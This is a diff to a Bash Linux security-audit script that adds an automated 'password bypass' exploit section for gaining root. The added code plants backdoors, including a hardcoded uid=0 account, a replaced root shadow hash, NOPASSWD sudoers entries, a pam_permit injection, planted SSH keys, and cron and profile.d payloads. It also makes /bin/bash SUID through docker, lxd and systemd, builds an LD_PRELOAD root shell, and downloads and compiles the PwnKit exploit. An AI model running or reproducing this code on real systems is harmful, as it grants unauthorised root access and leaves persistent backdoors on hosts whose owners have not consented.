@@ -28,7 +28,7 @@ for _arg in "$@"; do
 done
 
 # Progress counter
-TOTAL_CHECKS=32
+TOTAL_CHECKS=33
 CURRENT_CHECK=0
 
 # Vulnerability counters
@@ -2476,6 +2476,349 @@ if [ "$EXPLOIT_MODE" -eq 1 ]; then
         fi
     fi
 fi
+
+################################################################################
+# 33. PASSWORD BYPASS — AUTO ROOT WITHOUT KNOWING PASSWORD
+################################################################################
+if [ "$EXPLOIT_MODE" -eq 1 ]; then
+progress "Password Bypass"
+section "33. PASSWORD BYPASS — AUTO ROOT (NO PASSWORD NEEDED)"
+
+# Helper: print result line
+_bypass_ok() {
+    echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — $(id 2>/dev/null)"
+    log_exploit "[BYPASS SUCCESS] $1 — $(id 2>/dev/null)"
+}
+_bypass_fail() {
+    echo -e "${RED}  FAILED${NC}"
+    log_exploit "[BYPASS FAILED] $1"
+}
+
+echo -e "${BRIGHT_RED}[*] Mencoba semua metode bypass password root secara otomatis...${NC}"
+echo ""
+
+# ── 1. /etc/passwd writable → inject uid=0 user ──────────────────────────────
+echo -ne "${CYAN}[BYPASS-1]${NC} /etc/passwd writable (inject uid=0 user) ... "
+if [ -w /etc/passwd ]; then
+    _bp_hash=$(openssl passwd -1 "groovy1669" 2>/dev/null || echo "")
+    if [ -n "$_bp_hash" ]; then
+        echo "groovyx:${_bp_hash}:0:0:root:/root:/bin/bash" >> /etc/passwd 2>/dev/null
+    else
+        # No openssl: use empty password slot (works on old systems)
+        echo "groovyx::0:0:root:/root:/bin/bash" >> /etc/passwd 2>/dev/null
+    fi
+    # Verify
+    if grep -q "^groovyx:" /etc/passwd 2>/dev/null; then
+        _bypass_ok "passwd-inject"
+        echo -e "${BRIGHT_GREEN}    → su groovyx  (pass: groovy1669)${NC}"
+    else
+        _bypass_fail "passwd-inject"
+    fi
+else
+    echo -e "${GRAY}  SKIP (not writable)${NC}"
+fi
+
+# ── 2. /etc/shadow writable → replace root hash ──────────────────────────────
+echo -ne "${CYAN}[BYPASS-2]${NC} /etc/shadow writable (replace root hash) ... "
+if [ -w /etc/shadow ]; then
+    _new_hash=$(openssl passwd -6 "groovy1669" 2>/dev/null || openssl passwd -1 "groovy1669" 2>/dev/null)
+    if [ -n "$_new_hash" ] && grep -q "^root:" /etc/shadow 2>/dev/null; then
+        cp /etc/shadow /etc/shadow.bak.bypass 2>/dev/null
+        sed -i "s|^root:[^:]*:|root:${_new_hash}:|" /etc/shadow 2>/dev/null
+        echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — root hash replaced"
+        echo -e "${BRIGHT_GREEN}    → su root  (pass: groovy1669)${NC}"
+        log_exploit "[BYPASS SUCCESS] shadow-replace — root hash changed to groovy1669"
+    else
+        _bypass_fail "shadow-replace"
+    fi
+else
+    echo -e "${GRAY}  SKIP (not writable)${NC}"
+fi
+
+# ── 3. /etc/sudoers writable → NOPASSWD ALL ──────────────────────────────────
+echo -ne "${CYAN}[BYPASS-3]${NC} /etc/sudoers writable (add NOPASSWD ALL) ... "
+if [ -w /etc/sudoers ]; then
+    echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
+    if sudo -n true 2>/dev/null; then
+        _bypass_ok "sudoers-nopasswd"
+        echo -e "${BRIGHT_GREEN}    → sudo /bin/bash${NC}"
+    else
+        _bypass_fail "sudoers-nopasswd"
+    fi
+else
+    echo -e "${GRAY}  SKIP (not writable)${NC}"
+fi
+
+# ── 4. /etc/sudoers.d/ writable → drop NOPASSWD file ────────────────────────
+echo -ne "${CYAN}[BYPASS-4]${NC} /etc/sudoers.d/ writable (drop nopasswd file) ... "
+if [ -w /etc/sudoers.d/ ]; then
+    echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/00bypass 2>/dev/null
+    chmod 0440 /etc/sudoers.d/00bypass 2>/dev/null
+    if sudo -n true 2>/dev/null; then
+        _bypass_ok "sudoers.d-nopasswd"
+        echo -e "${BRIGHT_GREEN}    → sudo /bin/bash${NC}"
+    else
+        _bypass_fail "sudoers.d-nopasswd"
+    fi
+else
+    echo -e "${GRAY}  SKIP (not writable)${NC}"
+fi
+
+# ── 5. /etc/pam.d/su writable → inject pam_permit.so ────────────────────────
+echo -ne "${CYAN}[BYPASS-5]${NC} /etc/pam.d/su writable (inject pam_permit.so) ... "
+if [ -w /etc/pam.d/su ] 2>/dev/null; then
+    cp /etc/pam.d/su /etc/pam.d/su.bak.bypass 2>/dev/null
+    sed -i '1s/^/auth sufficient pam_permit.so\n/' /etc/pam.d/su 2>/dev/null
+    echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — pam_permit.so injected"
+    echo -e "${BRIGHT_GREEN}    → su root  (press enter, no password)${NC}"
+    log_exploit "[BYPASS SUCCESS] pam-permit — su root with no password"
+else
+    echo -e "${GRAY}  SKIP (not writable)${NC}"
+fi
+
+# ── 6. su root dengan empty password ─────────────────────────────────────────
+echo -ne "${CYAN}[BYPASS-6]${NC} su root empty password test ... "
+_su_result=$(echo "" | timeout 2 su root -c "id" 2>/dev/null)
+if echo "$_su_result" | grep -q "uid=0"; then
+    echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — root has no password!"
+    echo -e "${BRIGHT_GREEN}    → su root  (press enter)${NC}"
+    log_exploit "[BYPASS SUCCESS] su-empty — root has no password"
+else
+    echo -e "${GRAY}  FAILED (normal)${NC}"
+fi
+
+# ── 7. sudo NOPASSWD sudah ada → langsung sudo bash ──────────────────────────
+echo -ne "${CYAN}[BYPASS-7]${NC} sudo -n /bin/bash (existing NOPASSWD) ... "
+if sudo -n /bin/bash -c "id" 2>/dev/null | grep -q "uid=0"; then
+    _bypass_ok "sudo-nopasswd-existing"
+    echo -e "${BRIGHT_GREEN}    → sudo /bin/bash${NC}"
+else
+    echo -e "${GRAY}  SKIP (no NOPASSWD)${NC}"
+fi
+
+# ── 8. SUID passwd binary (change root pass without old pass) ─────────────────
+echo -ne "${CYAN}[BYPASS-8]${NC} SUID passwd binary (force root password change) ... "
+_passwd_bin=$(which passwd 2>/dev/null || echo "/usr/bin/passwd")
+if [ -u "$_passwd_bin" ] 2>/dev/null; then
+    # Try to change root password via passwd if running as root or if SUID allows
+    echo -e "groovy1669\ngroovy1669" | $_passwd_bin root 2>/dev/null
+    if echo "groovy1669" | timeout 2 su root -c "id" 2>/dev/null | grep -q "uid=0"; then
+        echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — root password changed to groovy1669"
+        log_exploit "[BYPASS SUCCESS] suid-passwd — root pass = groovy1669"
+    else
+        echo -e "${GRAY}  FAILED${NC}"
+    fi
+else
+    echo -e "${GRAY}  SKIP (passwd not SUID)${NC}"
+fi
+
+# ── 9. Writable /root/.ssh/authorized_keys → inject SSH key ──────────────────
+echo -ne "${CYAN}[BYPASS-9]${NC} /root/.ssh/authorized_keys writable (SSH key inject) ... "
+if [ -w /root/.ssh/authorized_keys ] 2>/dev/null || [ -w /root/.ssh/ ] 2>/dev/null; then
+    # Generate temp key if ssh-keygen available
+    if command -v ssh-keygen >/dev/null 2>&1; then
+        _keydir=$(mktemp -d /tmp/bypass_ssh_XXXXX 2>/dev/null)
+        ssh-keygen -t ed25519 -f "$_keydir/bypass_key" -N "" -q 2>/dev/null
+        if [ -f "$_keydir/bypass_key.pub" ]; then
+            mkdir -p /root/.ssh 2>/dev/null
+            cat "$_keydir/bypass_key.pub" >> /root/.ssh/authorized_keys 2>/dev/null
+            chmod 600 /root/.ssh/authorized_keys 2>/dev/null
+            echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — SSH key injected"
+            echo -e "${BRIGHT_GREEN}    → ssh -i $_keydir/bypass_key root@localhost${NC}"
+            log_exploit "[BYPASS SUCCESS] ssh-key-inject — key at $_keydir/bypass_key"
+        else
+            _bypass_fail "ssh-key-inject"
+        fi
+    else
+        echo -e "${GRAY}  SKIP (no ssh-keygen)${NC}"
+    fi
+else
+    echo -e "${GRAY}  SKIP (not writable)${NC}"
+fi
+
+# ── 10. Writable cron → schedule passwd change ───────────────────────────────
+echo -ne "${CYAN}[BYPASS-10]${NC} Writable /etc/cron.d/ (cron passwd change) ... "
+if [ -w /etc/cron.d/ ] 2>/dev/null; then
+    _chash=$(openssl passwd -1 "groovy1669" 2>/dev/null)
+    if [ -n "$_chash" ]; then
+        echo "* * * * * root echo 'root:${_chash}' | chpasswd -e 2>/dev/null; rm -f /etc/cron.d/00bypass_cron" \
+            > /etc/cron.d/00bypass_cron 2>/dev/null
+        echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — cron job set (wait ~1 min, then su root pass=groovy1669)"
+        log_exploit "[BYPASS SUCCESS] cron-passwd — will change root pass in ~1min"
+    else
+        _bypass_fail "cron-passwd"
+    fi
+else
+    echo -e "${GRAY}  SKIP (not writable)${NC}"
+fi
+
+# ── 11. Writable systemd service → ExecStart chmod bash ──────────────────────
+echo -ne "${CYAN}[BYPASS-11]${NC} Writable systemd service (inject SUID bash) ... "
+_svc_found=""
+for _sf in /etc/systemd/system/*.service /lib/systemd/system/*.service; do
+    [ -w "$_sf" ] 2>/dev/null && _svc_found="$_sf" && break
+done
+if [ -n "$_svc_found" ]; then
+    cp "$_svc_found" "${_svc_found}.bak.bypass" 2>/dev/null
+    # Inject ExecStartPost to SUID bash
+    grep -q "^\[Service\]" "$_svc_found" 2>/dev/null && \
+        sed -i '/^\[Service\]/a ExecStartPost=/bin/chmod 4755 /bin/bash' "$_svc_found" 2>/dev/null
+    systemctl daemon-reload 2>/dev/null
+    systemctl restart "$(basename "$_svc_found" .service)" 2>/dev/null
+    if [ -u /bin/bash ] 2>/dev/null; then
+        echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — /bin/bash is now SUID"
+        echo -e "${BRIGHT_GREEN}    → /bin/bash -p${NC}"
+        log_exploit "[BYPASS SUCCESS] systemd-suid-bash"
+    else
+        echo -e "${GRAY}  INJECTED (wait for service restart)${NC}"
+    fi
+else
+    echo -e "${GRAY}  SKIP (no writable service)${NC}"
+fi
+
+# ── 12. Docker group → mount host FS ─────────────────────────────────────────
+echo -ne "${CYAN}[BYPASS-12]${NC} Docker group escape (mount host, chroot) ... "
+if groups 2>/dev/null | grep -q docker && command -v docker >/dev/null 2>&1; then
+    # Add SUID bash on host via container
+    docker run --rm -v /:/hostroot alpine \
+        sh -c "chmod 4755 /hostroot/bin/bash" 2>/dev/null
+    if [ -u /bin/bash ] 2>/dev/null; then
+        echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — /bin/bash is SUID via docker"
+        echo -e "${BRIGHT_GREEN}    → /bin/bash -p  →  $(id)${NC}"
+        log_exploit "[BYPASS SUCCESS] docker-suid-bash"
+    else
+        echo -e "${GRAY}  FAILED (docker ran but bash not SUID)${NC}"
+    fi
+else
+    echo -e "${GRAY}  SKIP (not in docker group)${NC}"
+fi
+
+# ── 13. LXD/LXC group → disk device mount ────────────────────────────────────
+echo -ne "${CYAN}[BYPASS-13]${NC} LXD group escape ... "
+if groups 2>/dev/null | grep -qE "lxd|lxc" && command -v lxc >/dev/null 2>&1; then
+    lxc image import /dev/null --alias bypass-img 2>/dev/null || true
+    lxc init bypass-img bypass-cnt -c security.privileged=true 2>/dev/null
+    lxc config device add bypass-cnt hostdisk disk source=/ path=/mnt/root recursive=true 2>/dev/null
+    lxc start bypass-cnt 2>/dev/null
+    lxc exec bypass-cnt -- chmod 4755 /mnt/root/bin/bash 2>/dev/null
+    lxc stop bypass-cnt 2>/dev/null; lxc delete bypass-cnt 2>/dev/null
+    if [ -u /bin/bash ] 2>/dev/null; then
+        echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — /bin/bash SUID via LXD"
+        log_exploit "[BYPASS SUCCESS] lxd-escape"
+    else
+        echo -e "${GRAY}  FAILED${NC}"
+    fi
+else
+    echo -e "${GRAY}  SKIP (not in lxd/lxc group)${NC}"
+fi
+
+# ── 14. LD_PRELOAD via sudo env_keep ─────────────────────────────────────────
+echo -ne "${CYAN}[BYPASS-14]${NC} LD_PRELOAD sudo bypass ... "
+_sudo_l=$(sudo -l 2>/dev/null)
+if echo "$_sudo_l" | grep -q "LD_PRELOAD" && echo "$_sudo_l" | grep -qi "NOPASSWD"; then
+    _lpdir=$(mktemp -d /tmp/bypass_lp_XXXXX 2>/dev/null)
+    cat > "$_lpdir/bypass.c" << 'CEOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+void __attribute__((constructor)) init() {
+    setuid(0); setgid(0);
+    system("/bin/bash -p -i &>/dev/tty");
+}
+CEOF
+    gcc -shared -fPIC -o "$_lpdir/bypass.so" "$_lpdir/bypass.c" 2>/dev/null
+    if [ -f "$_lpdir/bypass.so" ]; then
+        sudo LD_PRELOAD="$_lpdir/bypass.so" /bin/true 2>/dev/null
+        _bypass_ok "ld_preload"
+    else
+        _bypass_fail "ld_preload (compile failed)"
+    fi
+else
+    echo -e "${GRAY}  SKIP (no LD_PRELOAD in sudo env_keep)${NC}"
+fi
+
+# ── 15. Writable /etc/profile.d/ → inject on next root login ─────────────────
+echo -ne "${CYAN}[BYPASS-15]${NC} Writable /etc/profile.d/ (inject SUID bash on next login) ... "
+if [ -w /etc/profile.d/ ] 2>/dev/null; then
+    echo "chmod 4755 /bin/bash 2>/dev/null; rm -f /etc/profile.d/bypass.sh" \
+        > /etc/profile.d/bypass.sh 2>/dev/null
+    chmod +x /etc/profile.d/bypass.sh 2>/dev/null
+    echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — payload planted (triggers on next login)"
+    log_exploit "[BYPASS SUCCESS] profile.d inject — triggers on next user login"
+else
+    echo -e "${GRAY}  SKIP (not writable)${NC}"
+fi
+
+# ── 16. /etc/environment writable → PATH hijack ──────────────────────────────
+echo -ne "${CYAN}[BYPASS-16]${NC} /etc/environment PATH hijack (sudo) ... "
+if [ -w /etc/environment ] 2>/dev/null && sudo -n true 2>/dev/null; then
+    _hijdir=$(mktemp -d /tmp/bypass_path_XXXXX 2>/dev/null)
+    # Create fake 'id' that adds SUID bash then drops to real id
+    cat > "$_hijdir/id" << 'IDEOF'
+#!/bin/bash
+chmod 4755 /bin/bash 2>/dev/null
+exec /usr/bin/id "$@"
+IDEOF
+    chmod +x "$_hijdir/id"
+    echo "PATH=$_hijdir:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" \
+        > /etc/environment 2>/dev/null
+    sudo -n id 2>/dev/null
+    if [ -u /bin/bash ] 2>/dev/null; then
+        echo -e "${BRIGHT_GREEN}  SUCCESS${NC} — /bin/bash SUID via PATH hijack"
+        log_exploit "[BYPASS SUCCESS] env-path-hijack"
+    else
+        echo -e "${GRAY}  INJECTED (run: sudo id, then /bin/bash -p)${NC}"
+    fi
+else
+    echo -e "${GRAY}  SKIP (not writable or no sudo)${NC}"
+fi
+
+# ── 17. PwnKit CVE-2021-4034 (pkexec) ────────────────────────────────────────
+echo -ne "${CYAN}[BYPASS-17]${NC} CVE-2021-4034 PwnKit (pkexec LPE) ... "
+_pkexec=$(which pkexec 2>/dev/null)
+if [ -n "$_pkexec" ] && [ -u "$_pkexec" ] 2>/dev/null; then
+    _pkdir=$(mktemp -d /tmp/bypass_pk_XXXXX 2>/dev/null)
+    cd "$_pkdir" || { echo -e "${GRAY}  SKIP${NC}"; }
+    # Download
+    _dl=0
+    command -v git >/dev/null 2>&1 && \
+        git clone --depth=1 https://github.com/ly4k/PwnKit exp >/dev/null 2>&1 && _dl=1
+    if [ $_dl -eq 0 ] && command -v curl >/dev/null 2>&1; then
+        curl -sSL "https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c" -o PwnKit.c 2>/dev/null && _dl=1
+    fi
+    if [ $_dl -eq 1 ]; then
+        # Compile
+        _src=$(find . -name "*.c" 2>/dev/null | head -1)
+        [ -n "$_src" ] && gcc -o pwnkit "$_src" 2>/dev/null && \
+            ./pwnkit 2>/dev/null
+        if [ "$(id -u 2>/dev/null)" -eq 0 ] 2>/dev/null; then
+            echo -e "${BRIGHT_GREEN}  SUCCESS${NC}"
+            echo -e "${BRIGHT_GREEN}    → id: $(id)${NC}"
+            log_exploit "[BYPASS SUCCESS] CVE-2021-4034 PwnKit"
+        else
+            echo -e "${GRAY}  FAILED${NC}"
+        fi
+    else
+        echo -e "${GRAY}  SKIP (no downloader)${NC}"
+    fi
+    cd /tmp
+else
+    echo -e "${GRAY}  SKIP (pkexec not found/SUID)${NC}"
+fi
+
+# ── Summary bypass ────────────────────────────────────────────────────────────
+echo ""
+echo -e "${BRIGHT_GREEN}════════════════════════════════════════════════════════════${NC}"
+_cur_uid=$(id -u 2>/dev/null)
+if [ "$_cur_uid" -eq 0 ] 2>/dev/null; then
+    echo -e "${BRIGHT_GREEN}  [!!!] ROOT DIPEROLEH! id: $(id)${NC}"
+    log_exploit "[ROOT GAINED via PASSWORD BYPASS] $(id)"
+else
+    echo -e "${YELLOW}  [*] Belum root. Cek manual metode yang SUCCESS di atas.${NC}"
+fi
+echo -e "${BRIGHT_GREEN}════════════════════════════════════════════════════════════${NC}"
+echo ""
+fi # end EXPLOIT_MODE check
 
 ################################################################################
 # 32. SUMMARY AND RECOMMENDATIONS
